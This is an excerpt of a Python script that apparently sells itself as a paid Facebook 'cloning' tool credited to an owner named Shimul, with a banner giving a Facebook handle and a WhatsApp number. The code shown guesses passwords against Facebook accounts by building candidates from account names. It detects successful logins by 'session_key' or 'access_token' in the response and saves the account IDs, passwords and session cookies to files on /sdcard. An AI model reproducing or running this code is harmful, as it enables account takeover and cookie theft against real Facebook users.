...
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] GIFTED BY SHAJON ')
try:
    import requests 
except ImportError:
...
___  _________       _   _   ___  _____  _   __ ___________ 
|  \/  || ___ \     | | | | / _ \/  __ \| | / /|  ___| ___ \
| .  . || |_/ /_____| |_| |/ /_\ \ /  \/| |/ / | |__ | |_/ /
| |\/| ||    /______|  _  ||  _  | |    |    \ |  __||    / 
| |  | || |\ \      | | | || | | | \__/\| |\  \| |___| |\ \ 
\_|  |_/\_| \_|     \_| |_/\_| |_/\____/\_| \_/\____/\_| \_|                                                                                                                    
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} Shimul
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} Md Shimulツ゚
{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G3} FILE {A}&{G4} RANDOM CLONING
{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} PAID
{G1}[{A}={G4}]{G4} WHATSAPP {A}:{G4} +8801975549322...!
{A}──────────────────────────────────────────────────"""
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/SANJIDA.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}SANJIDA-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[SHIMUL-OK] {sid} | {ps} ")
                    open('/sdcard/SHIMUL-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[SHIMUL-CP] {sid} | {ps} ")
                     open('/sdcard/SHIMUL-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                     break
                else:
                    continue
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}SHIMUL-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{G1}[SHIMUL-OK] {sid} | {ps} ")
                    open('/sdcard/SHIMUL-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[SHIMUL-CP] {sid} | {ps} ")
                    open('/sdcard/SHIMUL-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}SANJIDA{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[SHIMUL-OK] {uid} | {pas}')
